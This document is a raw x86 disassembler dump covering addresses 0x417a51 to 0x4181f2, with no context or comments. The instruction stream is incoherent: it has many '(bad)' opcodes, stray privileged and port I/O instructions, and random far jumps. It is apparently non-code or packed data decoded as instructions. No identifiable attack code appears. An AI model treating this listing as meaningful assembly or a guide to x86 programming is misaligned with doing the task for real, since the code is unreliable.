  417a51:	fs dec ebx
  417a53:	sub    al,0x89
  417a55:	and    BYTE PTR [esi-0x80],0xc6
  417a59:	cmp    ebx,DWORD PTR [ecx]
  417a5b:	jo     0x417a3d
  417a5d:	jp     0x417a77
  417a5f:	es push edx
  417a61:	mov    ds:0x4176021,al
  417a66:	stos   DWORD PTR es:[edi],eax
  417a67:	(bad)  
  417a68:	fiadd  DWORD PTR [esi]
  417a6a:	(bad)  
  417a6b:	xchg   ebx,eax
  417a6c:	add    eax,DWORD PTR [eax+0x6d6bf941]
  417a72:	sub    eax,0xa6df15aa
  417a77:	scas   al,BYTE PTR es:[edi]
  417a78:	je     0x417a08
  417a7a:	pop    ebx
  417a7b:	jecxz  0x417ad6
  417a7d:	fisubr WORD PTR [eax+0x560c85f4]
  417a83:	adc    DWORD PTR [ebx+0x69a03fc3],esp
  417a89:	inc    ecx
  417a8a:	pop    ebp
  417a8b:	dec    ebp
  417a8c:	cwde   
  417a8d:	adc    DWORD PTR [edi+0x19],esi
  417a90:	mov    ah,0xef
  417a92:	repz xor al,dl
  417a95:	lea    eax,[ecx]
  417a97:	shr    DWORD PTR [ebx+0x6aac32],1
  417a9d:	push   DWORD PTR ds:0xf24bbf1
  417aa3:	stc    
  417aa4:	popf   
  417aa5:	pop    esp
  417aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa7:	pushf  
  417aa8:	mov    cl,0xcf
  417aaa:	sub    bh,BYTE PTR [eax-0x4]
  417aad:	jle    0x417a93
  417aaf:	out    0x53,eax
  417ab1:	push   ds
  417ab2:	jg     0x417ace
  417ab4:	xlat   BYTE PTR ds:[ebx]
  417ab5:	push   eax
  417ab6:	adc    esp,eax
  417ab8:	dec    edx
  417ab9:	xchg   esi,eax
  417aba:	lods   eax,DWORD PTR ds:[esi]
  417abb:	cwde   
  417abc:	call   0x1648:0x95c301de
  417ac3:	pop    ss
  417ac4:	xchg   ebx,eax
  417ac5:	sub    esi,DWORD PTR [edx+0x69]
  417ac8:	loopne 0x417a86
  417aca:	mov    al,0xe3
  417acc:	and    ch,bh
  417ace:	mov    edi,DWORD PTR [edx-0x4abb80a1]
  417ad4:	lods   eax,DWORD PTR ds:[esi]
  417ad5:	aad    0x2e
  417ad7:	mov    edi,0xa55a37a1
  417adc:	adc    ecx,ebp
  417ade:	push   ebp
  417adf:	push   ss
  417ae0:	sahf   
  417ae1:	dec    ebp
  417ae2:	mov    esi,0x7ebc47c3
  417ae7:	or     eax,DWORD PTR [edi+0x7d]
  417aea:	nop
  417aeb:	dec    ecx
  417aec:	cmp    eax,DWORD PTR [ebx+0x74f0cdf3]
  417af2:	mov    dh,0xb4
  417af4:	lods   al,BYTE PTR ds:[esi]
  417af5:	pop    ss
  417af6:	or     DWORD PTR [edi+0x701a01c],eax
  417afc:	test   eax,0xf2b1cfb6
  417b01:	and    bh,cl
  417b03:	es push ds
  417b05:	(bad)
  417b09:	(bad)  
  417b0a:	mov    DWORD PTR [edx+ecx*4],0x4ec9aa03
  417b11:	fdivr  st,st(3)
  417b13:	adc    eax,0xf557a520
  417b18:	fdiv   DWORD PTR [ecx+0x78]
  417b1b:	mov    ds:0x3aec2af2,al
  417b20:	jne    0x417ab0
  417b22:	adc    DWORD PTR [edx-0x54],edx
  417b25:	clc    
  417b26:	sbb    DWORD PTR [ebp+0x4cc27b4a],ebp
  417b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b2d:	mov    al,0xdc
  417b2f:	mov    edx,0xf497175e
  417b34:	jge    0x417b5d
  417b36:	sahf   
  417b37:	sbb    eax,0x27e30d9f
  417b3c:	mov    al,0x62
  417b3e:	gs adc al,0x96
  417b41:	aaa    
  417b42:	dec    eax
  417b43:	das    
  417b44:	push   es
  417b45:	test   BYTE PTR [ebx+0x42],ch
  417b48:	add    al,0x2e
  417b4a:	inc    esp
  417b4b:	xchg   DWORD PTR [esi],ecx
  417b4d:	dec    edx
  417b4e:	ins    BYTE PTR es:[edi],dx
  417b4f:	stc    
  417b50:	push   cs
  417b51:	aad    0x49
  417b53:	adc    BYTE PTR [ecx],ah
  417b55:	icebp  
  417b56:	ins    DWORD PTR es:[edi],dx
  417b57:	int3   
  417b58:	sbb    dh,BYTE PTR [ecx]
  417b5a:	scas   al,BYTE PTR es:[edi]
  417b5b:	pop    ss
  417b5c:	push   0x51
  417b5e:	xor    DWORD PTR [ecx-0x1cd5e6b0],esi
  417b64:	mov    cs,WORD PTR [eax-0x74e3e8db]
  417b6a:	mov    bh,0xd1
  417b6c:	inc    ebp
  417b6d:	cmp    DWORD PTR [ecx-0x23ba7f8a],eax
  417b73:	test   DWORD PTR [ecx-0x13],esi
  417b76:	das    
  417b77:	(bad)  
  417b78:	mov    dh,0xd4
  417b7a:	stos   BYTE PTR es:[edi],al
  417b7b:	(bad)  
  417b7c:	jg     0x417aff
  417b7e:	bound  edx,QWORD PTR gs:[ebx]
  417b81:	test   eax,0xe4a18c6a
  417b86:	add    eax,0xddc36231
  417b8b:	xchg   BYTE PTR [esi],ah
  417b8d:	mov    eax,0x5f44746a
  417b92:	cld    
  417b93:	inc    ecx
  417b94:	clc    
  417b95:	and    DWORD PTR [ebx+0x2d],ebp
  417b98:	imul   cl
  417b9a:	std    
  417b9b:	jmp    0x417ba5
  417b9d:	(bad)  
  417b9e:	repnz fs push edx
  417ba1:	sahf   
  417ba2:	iret   
  417ba3:	clc    
  417ba4:	imul   eax,DWORD PTR [edx+0x6e03a86],0x2dd27b9c
  417bae:	mov    ebp,edi
  417bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417bb1:	mov    dx,0xa4ac
  417bb5:	push   edi
  417bb6:	jl     0x417ba3
  417bb8:	dec    eax
  417bb9:	inc    ecx
  417bba:	or     al,0x62
  417bbc:	xor    DWORD PTR [esi-0x4a],ebp
  417bbf:	clc    
  417bc0:	xor    ch,al
  417bc2:	rcr    BYTE PTR [eax],0x8
  417bc5:	into   
  417bc6:	adc    eax,0xc8f4c8ab
  417bcb:	mov    bl,0x69
  417bcd:	mov    eax,ds:0x7600e3c5
  417bd2:	cli    
  417bd3:	adc    eax,0x4b4b84b4
  417bd8:	lahf   
  417bd9:	(bad)  
  417bda:	push   0x38fa9a8a
  417bdf:	fxam   
  417be1:	xor    eax,0x56e7b408
  417be6:	mov    dh,0xcf
  417be8:	ror    DWORD PTR [edx+0x37],1
  417beb:	jno    0x417b7e
  417bed:	add    dl,ch
  417bef:	ret    0x4bc0
  417bf2:	rol    DWORD PTR ds:0xb3e46083,cl
  417bf8:	aas    
  417bf9:	push   es
  417bfa:	jmp    0x5b76:0x69ce40d2
  417c01:	pop    esp
  417c02:	repz addr16 add ah,cl
  417c06:	inc    edi
  417c07:	sbb    al,0x76
  417c09:	push   0xa8e74aaa
  417c0e:	mov    ecx,0x22d1deda
  417c13:	adc    ah,BYTE PTR [eax]
  417c15:	loop   0x417c08
  417c17:	loop   0x417c28
  417c19:	mov    dl,BYTE PTR [esi+ebx*2-0x3d]
  417c1d:	cli    
  417c1e:	fdiv   DWORD PTR [esi+0x5cda404f]
  417c24:	or     dl,dh
  417c26:	(bad)  
  417c27:	mov    al,0xc
  417c29:	and    al,0x1a
  417c2b:	cmp    al,0x2
  417c2d:	mov    cl,0xa2
  417c2f:	sub    BYTE PTR [esi],0x97
  417c32:	out    dx,al
  417c33:	or     dl,0x0
  417c36:	mov    ah,0xad
  417c38:	mov    bl,BYTE PTR [ebp+esi*1-0x79ea3a8d]
  417c3f:	jp     0x417c0a
  417c41:	in     eax,0x3d
  417c43:	adc    DWORD PTR [edi],ebx
  417c45:	add    ch,al
  417c47:	sub    ebx,ecx
  417c49:	push   ecx
  417c4a:	push   edi
  417c4b:	stos   DWORD PTR es:[edi],eax
  417c4c:	cwde   
  417c4d:	imul   eax,DWORD PTR [ebx],0xfffffffe
  417c50:	lahf   
  417c51:	nop
  417c52:	sbb    edi,DWORD PTR [esi-0x24]
  417c55:	jmp    0x3233:0xe8975edd
  417c5c:	jb     0x417c6c
  417c5e:	add    ebp,esi
  417c60:	outs   dx,BYTE PTR ds:[esi]
  417c61:	in     eax,0x8c
  417c63:	stc    
  417c64:	add    eax,0x9a43a43
  417c69:	xor    al,0x8d
  417c6b:	daa    
  417c6c:	enter  0xf6eb,0x80
  417c70:	pop    es
  417c71:	nop
  417c72:	shl    DWORD PTR [esi],1
  417c74:	or     al,0x1a
  417c76:	xchg   BYTE PTR [edi-0x48],bh
  417c79:	mov    ebx,0x459506ca
  417c7e:	fdiv   DWORD PTR [edx+0x76]
  417c81:	cmp    DWORD PTR [edi+0x78],ebp
  417c84:	nop
  417c85:	aam    0xa0
  417c87:	bound  eax,QWORD PTR [ebx+0x37]
  417c8a:	arpl   si,bx
  417c8c:	pop    ecx
  417c8d:	aad    0x42
  417c8f:	and    dh,dl
  417c91:	mov    DWORD PTR [ecx+0x59],edi
  417c94:	ds cli 
  417c96:	and    edx,DWORD PTR [ecx]
  417c98:	mov    eax,ds:0xaab9c42
  417c9d:	adc    esi,DWORD PTR [ebx-0x34]
  417ca0:	repnz inc edi
  417ca2:	lahf   
  417ca3:	mov    DWORD PTR [ecx*4-0x4816205b],esp
  417caa:	add    cl,BYTE PTR [edx]
  417cac:	xabort 0xc2
  417caf:	neg    BYTE PTR [edx+edx*1+0x74]
  417cb3:	(bad)  
  417cb4:	rcr    BYTE PTR [ebp-0x4d],cl
  417cb7:	pop    esp
  417cb8:	cmp    DWORD PTR [ecx],ebp
  417cba:	sbb    esi,DWORD PTR [eax+0x121e90d8]
  417cc0:	inc    ecx
  417cc1:	les    ebp,FWORD PTR [edi-0x4feb42b]
  417cc7:	pop    es
  417cc8:	sbb    DWORD PTR [ebx+edi*1+0x6617b484],edx
  417ccf:	fdiv   st,st(5)
  417cd1:	in     eax,0x1e
  417cd3:	outs   dx,BYTE PTR ds:[esi]
  417cd4:	das    
  417cd5:	shl    DWORD PTR [eax-0x7ea9704f],1
  417cdb:	out    0x36,eax
  417cdd:	xchg   DWORD PTR [ebx+0x345ab296],eax
  417ce3:	aas    
  417ce4:	in     eax,dx
  417ce5:	adc    eax,0xddf459f
  417cea:	push   eax
  417ceb:	shl    DWORD PTR [ebp+ecx*2-0x6f0fdd30],1
  417cf2:	fstp   DWORD PTR [eax+esi*1-0x45904303]
  417cf9:	and    DWORD PTR [ecx+0x7],esi
  417cfc:	test   BYTE PTR [esi],dh
  417cfe:	fdivr  DWORD PTR [edi]
  417d00:	push   es
  417d01:	add    bl,BYTE PTR [ebx+0x38]
  417d04:	inc    edx
  417d05:	cmp    BYTE PTR [edi],ah
  417d07:	int3   
  417d08:	push   0x154005be
  417d0d:	dec    esp
  417d0e:	mov    eax,0x596ade5f
  417d13:	test   BYTE PTR [ebx],dh
  417d15:	dec    esi
  417d16:	enter  0x2216,0xd8
  417d1a:	inc    eax
  417d1b:	jmp    FWORD PTR [ebp-0x6b5b7774]
  417d21:	test   eax,0xb3e88ac1
  417d26:	cld    
  417d27:	(bad)  
  417d28:	add    eax,0x7457dd27
  417d2d:	popf   
  417d2e:	repz mov bl,0xb5
  417d31:	mov    edx,0xc1bba654
  417d36:	ret    0x504
  417d39:	xchg   ecx,eax
  417d3a:	jg     0x417d53
  417d3c:	mov    dh,0x32
  417d3e:	add    al,0x5e
  417d40:	outs   dx,BYTE PTR ds:[esi]
  417d41:	add    eax,0xb7f1c0a6
  417d46:	leave  
  417d47:	jl     0x417db0
  417d49:	or     esi,DWORD PTR ds:0xf85c7
  417d4f:	cmp    ebx,0x76
  417d52:	data16 mov dh,0x2d
  417d55:	pop    ebx
  417d56:	scas   al,BYTE PTR es:[edi]
  417d57:	iret   
  417d58:	shl    DWORD PTR [edi+edx*4-0x53],1
  417d5c:	or     bh,BYTE PTR [edi+0x35]
  417d5f:	adc    eax,0xa1156041
  417d64:	iret   
  417d65:	test   eax,0x7caeb75b
  417d6a:	sbb    dh,dh
  417d6c:	scas   al,BYTE PTR es:[edi]
  417d6d:	mov    ds:0x318baac7,eax
  417d72:	sahf   
  417d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d74:	sbb    DWORD PTR [bx+si-0xc1a],0x67ec84f1
  417d7d:	fmul   DWORD PTR [eax+0x6f9e71af]
  417d83:	lea    ecx,ds:0xab5d6226
  417d89:	add    DWORD PTR [esi-0x72],esp
  417d8c:	rcr    BYTE PTR [ecx-0x6c3be5ef],0xdf
  417d93:	mov    edx,0x9ad92692
  417d98:	loopne 0x417d81
  417d9a:	sub    al,0xe
  417d9c:	cmp    edx,ecx
  417d9e:	dec    ecx
  417d9f:	and    bh,dh
  417da1:	(bad)  
  417da2:	shr    ecx,0xaa
  417da5:	push   ebp
  417da6:	hlt    
  417da7:	test   DWORD PTR [esi],esp
  417da9:	(bad)  
  417daa:	push   ebx
  417dab:	scas   al,BYTE PTR es:[edi]
  417dac:	std    
  417dad:	outs   dx,DWORD PTR ds:[esi]
  417dae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417daf:	mov    eax,ds:0x1dfbec62
  417db4:	inc    ecx
  417db5:	push   0x8342d49b
  417dba:	jnp    0x417d50
  417dbc:	in     eax,dx
  417dbd:	push   ebx
  417dbe:	enter  0xac5e,0xa9
  417dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417dc3:	dec    ebp
  417dc4:	dec    esp
  417dc5:	mov    ds:0xc757b0a6,al
  417dca:	ss sub al,0x8a
  417dcd:	cmp    BYTE PTR [ecx+0x4555a773],0x7e
  417dd4:	out    0x6,al
  417dd6:	cmp    al,0x5a
  417dd8:	sub    ebx,DWORD PTR [ecx+0x42]
  417ddb:	pop    ds
  417ddc:	adc    eax,0x7206c041
  417de1:	loopne 0x417e1e
  417de3:	add    BYTE PTR [ecx],cl
  417de5:	int3   
  417de6:	or     DWORD PTR [eax-0x3599e750],0xffffff92
  417ded:	ins    DWORD PTR es:[edi],dx
  417dee:	inc    ecx
  417def:	jnp    0x417e2f
  417df1:	out    0x4a,eax
  417df3:	lea    esp,[edx-0x2d]
  417df6:	push   ds
  417df7:	ror    ebx,cl
  417df9:	stc    
  417dfa:	mov    esp,0xd3c9033f
  417dff:	pop    ecx
  417e00:	xchg   ebx,eax
  417e01:	test   BYTE PTR [edx],ch
  417e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e04:	iret   
  417e05:	jo     0x417d95
  417e07:	sbb    al,0x61
  417e09:	test   DWORD PTR [ebx-0x64339cdd],edx
  417e0f:	pop    ebx
  417e10:	jbe    0x417e4c
  417e12:	fcomp  DWORD PTR [esi+ebx*1+0x47f270f4]
  417e19:	dec    ecx
  417e1a:	and    BYTE PTR [ebp-0x4ddb35e8],ah
  417e20:	sub    DWORD PTR [esi],esp
  417e22:	sti    
  417e23:	pop    esp
  417e24:	or     cl,cl
  417e26:	mov    al,0xcc
  417e28:	xchg   ebx,eax
  417e29:	shl    BYTE PTR [eax],1
  417e2b:	dec    ebp
  417e2c:	add    al,0x44
  417e2e:	mov    dh,0xe6
  417e30:	xchg   edx,eax
  417e31:	fs into 
  417e33:	push   ebp
  417e34:	pop    esp
  417e35:	iret   
  417e36:	je     0x417e9b
  417e38:	pop    ds
  417e39:	aad    0x5f
  417e3b:	push   esi
  417e3c:	jmp    0x417e41
  417e3e:	jo     0x417e8a
  417e40:	sub    ah,dl
  417e42:	js     0x417e4f
  417e44:	or     dh,dl
  417e46:	jecxz  0x417e1c
  417e48:	cld    
  417e49:	add    ebx,edx
  417e4b:	sar    edx,cl
  417e4d:	inc    esp
  417e4e:	push   ecx
  417e4f:	push   ecx
  417e50:	sar    cl,1
  417e52:	dec    ebp
  417e53:	jne    0x417e23
  417e55:	ret    0xc658
  417e58:	and    eax,0x21a94b9
  417e5d:	leave  
  417e5e:	fsubr  DWORD PTR [edi-0x1956cc79]
  417e64:	leave  
  417e65:	jns    0x417e8a
  417e67:	(bad)  
  417e68:	and    al,0x47
  417e6a:	rol    DWORD PTR [eax],1
  417e6c:	repnz push cs
  417e6e:	jo     0x417e97
  417e70:	xlat   BYTE PTR ds:[ebx]
  417e71:	fucomi st,st(3)
  417e73:	stos   BYTE PTR es:[edi],al
  417e74:	je     0x417e3a
  417e76:	adc    DWORD PTR [eax-0x569e4c68],eax
  417e7c:	daa    
  417e7d:	add    al,0x8e
  417e7f:	jp     0x417e3a
  417e81:	dec    esp
  417e82:	gs lahf 
  417e84:	cmp    eax,0xe75c83e0
  417e89:	xor    eax,0x53bdfd56
  417e8e:	sub    al,0x17
  417e90:	jne    0x417eca
  417e92:	retf   
  417e93:	lahf   
  417e94:	jge    0x417ecd
  417e96:	push   0x30bac8ff
  417e9b:	(bad)  
  417e9c:	jecxz  0x417e36
  417e9e:	add    al,0xdb
  417ea0:	(bad)  
  417ea1:	mov    esi,0xa098be97
  417ea6:	and    al,0x60
  417ea8:	mov    ds:0x72585b8d,al
  417ead:	dec    ecx
  417eae:	and    eax,0x49aa6902
  417eb3:	mov    al,0x45
  417eb5:	fiadd  DWORD PTR ds:[eax+0x4b]
  417eb9:	mov    ch,BYTE PTR [edi-0x77fa8d74]
  417ebf:	sbb    ebx,DWORD PTR [edi+0x688fa658]
  417ec5:	and    al,0xf3
  417ec7:	std    
  417ec8:	popf   
  417ec9:	inc    esi
  417eca:	mov    WORD PTR [edx],?
  417ecc:	pop    ss
  417ecd:	push   edi
  417ece:	push   esp
  417ecf:	outs   dx,DWORD PTR ds:[esi]
  417ed0:	jne    0x417e58
  417ed2:	ror    BYTE PTR [edi],1
  417ed4:	dec    esp
  417ed5:	mov    eax,0xc1dddebf
  417eda:	mov    al,ds:0xa8938a38
  417edf:	push   0xffffffb1
  417ee1:	adc    esp,esi
  417ee3:	jno    0x417e76
  417ee5:	cwde   
  417ee6:	mov    ebp,DWORD PTR [edi-0x4d]
  417ee9:	push   esi
  417eea:	jbe    0x417f4b
  417eec:	scas   eax,DWORD PTR es:[edi]
  417eed:	sbb    DWORD PTR [esi],ecx
  417eef:	aam    0xf1
  417ef1:	xchg   BYTE PTR [edi+ebp*2+0x73],bl
  417ef5:	jp     0x417efd
  417ef7:	mov    al,0x2c
  417ef9:	(bad)  
  417efa:	xchg   esp,eax
  417efb:	jp     0x417f08
  417efd:	and    esp,DWORD PTR [ecx+ebx*8-0x2b]
  417f01:	push   ecx
  417f02:	sbb    cl,BYTE PTR [ebx-0x5d72601b]
  417f08:	jns    0x417eaf
  417f0a:	and    eax,0x8c29c214
  417f0f:	jmp    0x1b47de77
  417f14:	mov    edi,0x8ad5dac4
  417f19:	add    al,0x15
  417f1b:	adc    DWORD PTR [ebp+0x90f85d7],0x4c
  417f22:	out    dx,al
  417f23:	cdq    
  417f24:	dec    ebp
  417f25:	nop
  417f26:	jo     0x417f10
  417f28:	sahf   
  417f29:	mov    cs,WORD PTR [ebx-0x7205989e]
  417f2f:	mov    BYTE PTR [eax],ah
  417f31:	xchg   DWORD PTR [eax],ebp
  417f33:	mov    esp,0x1d42944c
  417f38:	iret   
  417f39:	xchg   BYTE PTR [esi],dl
  417f3b:	div    DWORD PTR [eax]
  417f3d:	sbb    ah,BYTE PTR [edx-0x25fd9697]
  417f43:	mov    ecx,0xd70b1a2
  417f48:	mov    bl,0x63
  417f4a:	mov    esi,0x8f96ed29
  417f4f:	scas   al,BYTE PTR es:[edi]
  417f50:	idiv   esi
  417f52:	add    al,0xf8
  417f54:	sub    ebx,DWORD PTR [ebx]
  417f56:	(bad)  
  417f59:	mov    dh,0xda
  417f5b:	les    esp,FWORD PTR [ebx+eax*4-0x2f79c172]
  417f62:	mov    ds:0x19e583ff,eax
  417f67:	cdq    
  417f68:	inc    ebp
  417f69:	mov    esi,0xf4781426
  417f6e:	nop
  417f6f:	popf   
  417f70:	inc    esp
  417f71:	add    al,0xd8
  417f73:	cmp    ebx,DWORD PTR [edx]
  417f75:	inc    esp
  417f76:	fsubr  st,st(0)
  417f78:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f7a:	and    eax,0x25849523
  417f7f:	pop    esi
  417f80:	mov    ch,0xb6
  417f82:	cmp    BYTE PTR [ebx+eiz*2],al
  417f85:	inc    esp
  417f86:	cmp    edx,edi
  417f88:	outs   dx,DWORD PTR ds:[esi]
  417f89:	in     eax,dx
  417f8a:	jne    0x417fa0
  417f8c:	dec    esp
  417f8d:	sbb    eax,DWORD PTR [edi]
  417f8f:	lock repz ja 0x417f58
  417f93:	cli    
  417f94:	loope  0x418013
  417f96:	dec    esp
  417f97:	es mov eax,0x17fcecb4
  417f9d:	pop    ecx
  417f9e:	cdq    
  417f9f:	mov    WORD PTR [ebx-0x6c34e64a],cs
  417fa5:	rol    DWORD PTR [esi+0x3b2094af],1
  417fab:	adc    DWORD PTR [edx],edx
  417fad:	adc    BYTE PTR [ebx+0x25],bl
  417fb0:	shr    DWORD PTR [eax+0x65],cl
  417fb3:	sbb    BYTE PTR [ebx+0x6b8ddc6],0xcd
  417fba:	dec    edi
  417fbb:	rol    BYTE PTR [esi-0x7c5605b8],1
  417fc1:	pop    eax
  417fc2:	(bad)  
  417fc3:	jae    0x417fd4
  417fc5:	test   DWORD PTR [edi-0x68],eax
  417fc8:	loope  0x417fae
  417fca:	sahf   
  417fcb:	mov    cl,0x3a
  417fcd:	lods   eax,DWORD PTR ds:[esi]
  417fce:	and    esi,0xfc03da2d
  417fd4:	jge    0x418037
  417fd6:	cli    
  417fd7:	dec    esi
  417fd8:	aad    0xa0
  417fda:	xchg   edx,eax
  417fdb:	pop    ecx
  417fdc:	loopne 0x41804c
  417fde:	jmp    0xc5f9:0xa797b79c
  417fe5:	push   ss
  417fe6:	xor    ah,al
  417fe8:	repnz xchg esi,eax
  417fea:	sbb    edx,DWORD PTR [edx]
  417fec:	jecxz  0x417fbd
  417fee:	stos   DWORD PTR es:[edi],eax
  417fef:	scas   eax,DWORD PTR es:[edi]
  417ff0:	xchg   ebx,eax
  417ff1:	mov    edx,0x294ae908
  417ff6:	xor    BYTE PTR [esi],dh
  417ff8:	pop    ds
  417ff9:	popa   
  417ffa:	loopne 0x418001
  417ffc:	and    ebp,edi
  417ffe:	jnp    0x418009
  418000:	and    eax,0xc70d1507
  418005:	add    edi,ebx
  418007:	jl     0x418022
  418009:	and    DWORD PTR [edx],0xd8f6cfa2
  41800f:	mov    ah,0x88
  418011:	dec    eax
  418012:	cmp    ebp,DWORD PTR [edx-0x1acf3952]
  418018:	cmp    al,0x1a
  41801a:	(bad)  
  41801b:	fstp   DWORD PTR [edi-0x797203c3]
  418021:	dec    edx
  418022:	dec    ecx
  418023:	fcomp  QWORD PTR [edx]
  418025:	dec    esp
  418026:	mov    ebp,DWORD PTR [edx+0x1bd70163]
  41802c:	loope  0x418001
  41802e:	mov    DWORD PTR [ebp+0x3d],edi
  418031:	(bad)  
  418032:	out    dx,al
  418033:	sti    
  418034:	or     BYTE PTR [eax+0x21],dh
  418037:	leave  
  418038:	inc    edx
  418039:	or     eax,0x6c978068
  41803e:	mov    ch,0x39
  418040:	and    DWORD PTR [esi+0x2d],eax
  418043:	and    BYTE PTR [edx-0x75],0x18
  418047:	push   edi
  418048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418049:	out    0xe2,eax
  41804b:	cwde   
  41804c:	call   0xacf07cf
  418051:	push   ecx
  418052:	inc    di
  418054:	scas   eax,DWORD PTR es:[edi]
  418055:	adc    dl,dh
  418057:	fsub   DWORD PTR [edx+ebx*4+0x5a514077]
  41805e:	sub    eax,0x73013f52
  418063:	fist   WORD PTR [ecx-0x38390a60]
  418069:	dec    esp
  41806a:	adc    al,0xb3
  41806c:	inc    ebp
  41806d:	fbld   TBYTE PTR [ecx]
  41806f:	outs   dx,BYTE PTR ds:[esi]
  418070:	lods   al,BYTE PTR ds:[esi]
  418071:	push   ds
  418072:	mov    dl,0x34
  418074:	pusha  
  418075:	fistp  DWORD PTR [esi-0x5f]
  418078:	jl     0x4180b1
  41807a:	and    ebp,DWORD PTR [ebx]
  41807c:	jne    0x418093
  41807e:	ret    0x2758
  418081:	mov    DWORD PTR [edi+0x6e],ecx
  418084:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418085:	lock retf 
  418087:	nop
  418088:	mov    eax,ds:0x8867271
  41808d:	retf   0x1a35
  418090:	push   ds
  418091:	add    eax,ebx
  418093:	add    eax,0xb6489ce7
  418098:	scas   eax,DWORD PTR es:[edi]
  418099:	add    bh,cl
  41809b:	add    esp,DWORD PTR [ebp-0x3bfcd92]
  4180a1:	test   eax,0xa017ccda
  4180a6:	jb     0x4180be
  4180a8:	stc    
  4180a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4180aa:	jns    0x418047
  4180ac:	jb     0x418061
  4180ae:	push   ss
  4180af:	mov    dh,0x3
  4180b1:	and    al,0x6d
  4180b3:	sbb    eax,0xd1b626fe
  4180b8:	pop    edi
  4180b9:	fisttp QWORD PTR [eax+ebx*4+0x26e71c56]
  4180c0:	pop    ds
  4180c1:	xchg   ebp,eax
  4180c2:	push   cs
  4180c3:	outs   dx,DWORD PTR ds:[esi]
  4180c4:	jns    0x4180a8
  4180c6:	rcr    al,cl
  4180c8:	es dec ecx
  4180ca:	test   DWORD PTR [esi+0x444e0ac4],ebx
  4180d0:	(bad)  
  4180d1:	out    0x3d,eax
  4180d3:	add    al,0x4f
  4180d5:	sbb    BYTE PTR [eax-0x1c8e7482],0x26
  4180dc:	hlt    
  4180dd:	imul   DWORD PTR [edi+eax*1+0x35]
  4180e1:	sbb    al,0xbe
  4180e3:	jo     0x41807e
  4180e5:	ret    0x1313
  4180e8:	dec    eax
  4180e9:	mov    esi,0x45fbb06a
  4180ee:	mov    BYTE PTR [ebx],dl
  4180f0:	cmp    DWORD PTR ds:0xda9be6d8,ebp
  4180f6:	sti    
  4180f7:	ins    DWORD PTR es:[edi],dx
  4180f8:	xor    BYTE PTR [eax-0x78],0x58
  4180fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4180fd:	inc    ebx
  4180fe:	scas   eax,DWORD PTR es:[edi]
  4180ff:	adc    ebp,0x24
  418102:	fistp  QWORD PTR [ebp+0x50]
  418105:	xor    eax,0x375d3105
  41810a:	adc    BYTE PTR [ebp+0x66],al
  41810d:	stos   BYTE PTR es:[edi],al
  41810e:	jecxz  0x418122
  418110:	dec    ebp
  418111:	mov    dh,0x23
  418113:	rol    BYTE PTR [ecx-0x6775b43e],0xb5
  41811a:	in     al,0x81
  41811c:	imul   eax,DWORD PTR [esi-0x4e],0x39
  418120:	xchg   ecx,eax
  418121:	dec    edi
  418122:	fnstsw WORD PTR [edi-0x32510fd9]
  418128:	js     0x4180e9
  41812a:	add    al,0xdb
  41812c:	ja     0x4181a7
  41812e:	mov    dh,0xe5
  418130:	sysexit 
  418132:	in     eax,dx
  418133:	or     eax,ecx
  418135:	das    
  418136:	test   DWORD PTR [ecx+0x24],0xd58fd20
  41813d:	inc    ebp
  41813e:	pop    ds
  41813f:	(bad)  
  418140:	enter  0xf7a2,0x1a
  418144:	or     DWORD PTR [ebp+0x3a],esp
  418147:	pop    esi
  418148:	dec    ebp
  418149:	icebp  
  41814a:	sbb    al,0x54
  41814c:	pop    ds
  41814d:	(bad)
  418150:	das    
  418151:	vpmacssww ymm12,ymm7,ymm7,YMMWORD PTR [esi]
  418157:	sbb    eax,0x2310843b
  41815c:	xchg   esi,eax
  41815d:	mov    eax,0x59e93d8a
  418162:	or     ebx,esi
  418164:	xchg   ebx,eax
  418165:	sub    eax,0x19318569
  41816a:	daa    
  41816b:	pop    esi
  41816c:	int3   
  41816d:	popa   
  41816e:	jo     0x418186
  418170:	dec    ecx
  418171:	adc    esi,DWORD PTR [edx+0x7a]
  418174:	mov    ebx,0xff054518
  418179:	sbb    eax,eax
  41817b:	xor    al,0x1b
  41817e:	push   ds
  41817f:	dec    edx
  418180:	std    
  418181:	pop    edx
  418182:	loope  0x418116
  418184:	sub    bh,BYTE PTR [edi]
  418186:	repnz out dx,eax
  418188:	and    BYTE PTR [eax+esi*1],ah
  41818b:	or     eax,0xf350c3a7
  418190:	xchg   esi,eax
  418191:	rcl    DWORD PTR [esi+0xe86f6ff],1
  418197:	out    0x85,eax
  418199:	or     al,0xbe
  41819b:	popf   
  41819c:	sar    DWORD PTR [edi+ebp*1],1
  41819f:	(bad)  
  4181a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181a1:	add    dl,bl
  4181a3:	xchg   ecx,eax
  4181a4:	cmp    dl,dl
  4181a6:	push   esp
  4181a7:	pusha  
  4181a8:	pop    ds
  4181a9:	mov    ch,0x62
  4181ab:	cs pop ss
  4181ad:	mov    ebp,DWORD PTR [edx]
  4181af:	or     BYTE PTR [ebx+0x60],al
  4181b2:	or     cl,BYTE PTR [ebx+0x8c25246]
  4181b8:	sbb    BYTE PTR [ecx-0x7962b00d],bh
  4181be:	or     BYTE PTR [edi-0x38],bl
  4181c1:	call   0x2c11efcc
  4181c6:	int    0x7b
  4181c8:	jno    0x4181e6
  4181ca:	push   ebp
  4181cb:	bound  esp,QWORD PTR [edx+ebx*1-0x97449b7]
  4181d2:	gs jno 0x41820f
  4181d5:	xchg   DWORD PTR [eax+edi*8+0x61],ebx
  4181d9:	add    eax,0x7f75bca2
  4181de:	add    ecx,0x53
  4181e1:	test   eax,0x447a265
  4181e6:	push   ss
  4181e7:	xchg   edx,eax
  4181e8:	or     DWORD PTR [edx-0x36c967e0],ebx
  4181ee:	test   DWORD PTR [esi-0xa],ebp
  4181f1:	scas   eax,DWORD PTR es:[edi]
  4181f2:	mov    ebp,0xe1ee5b82
